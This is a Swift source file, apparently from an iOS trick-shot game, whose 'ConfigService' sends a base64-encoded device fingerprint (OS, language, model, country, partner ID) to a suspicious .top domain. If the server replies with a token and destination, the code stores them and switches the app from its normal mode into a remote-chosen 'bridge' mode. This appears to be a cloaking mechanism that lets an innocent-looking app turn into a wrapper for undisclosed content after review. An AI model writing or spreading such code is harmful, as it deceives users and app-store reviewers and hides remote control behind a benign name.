import Foundation

enum SessionResolution {
    case bridge(token: String, destination: String)
    case application
}

final class ConfigService {
    static let shared = ConfigService()

    private let endpoint = "https://dgodinadch.top/ios-ricochetgoal-trickshots/json.php?token="
    private let partner = "FDhdHGSDGSG"

    private init() {}

    func resolve() async -> SessionResolution {
        if TokenStorage.shared.hasSession,
           let token = TokenStorage.shared.token,
           let destination = TokenStorage.shared.destination {
            return .bridge(token: token, destination: destination)
        }

        guard let request = makeRequest() else { return .application }

        do {
            let session = makeSession()
            let (data, _) = try await session.data(for: request)
            guard let response = String(data: data, encoding: .utf8) else { return .application }
            return parse(response)
        } catch {
            return .application
        }
    }

    private func parse(_ response: String) -> SessionResolution {
        guard let separatorIndex = response.firstIndex(of: "#") else {
            return .application
        }
        let token = String(response[response.startIndex..<separatorIndex])
        let destination = String(response[response.index(after: separatorIndex)...])
        guard !destination.isEmpty else { return .application }
        TokenStorage.shared.store(token: token, destination: destination)
        return .bridge(token: token, destination: destination)
    }

    private func makeRequest() -> URLRequest? {
        let payload = "p=\(partner)"
            + "&os=\(DeviceInfo.systemDescription)"
            + "&lng=\(DeviceInfo.primaryLanguage)"
            + "&devicemodel=\(DeviceInfo.modelIdentifier)"
            + "&country=\(DeviceInfo.regionCode)"

        let encoded = Data(payload.utf8).base64EncodedString()
        let allowed = CharacterSet(charactersIn: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_.~")
        let escaped = encoded.addingPercentEncoding(withAllowedCharacters: allowed) ?? encoded

        guard let address = URL(string: endpoint + escaped) else { return nil }
        var request = URLRequest(url: address)
        request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        request.httpMethod = "GET"
        request.setValue("no-cache", forHTTPHeaderField: "Cache-Control")
        request.setValue("no-cache", forHTTPHeaderField: "Pragma")
        return request
    }

    private func makeSession() -> URLSession {
        let configuration = URLSessionConfiguration.ephemeral
        configuration.requestCachePolicy = .reloadIgnoringLocalAndRemoteCacheData
        configuration.urlCache = nil
        return URLSession(configuration: configuration)
    }
}
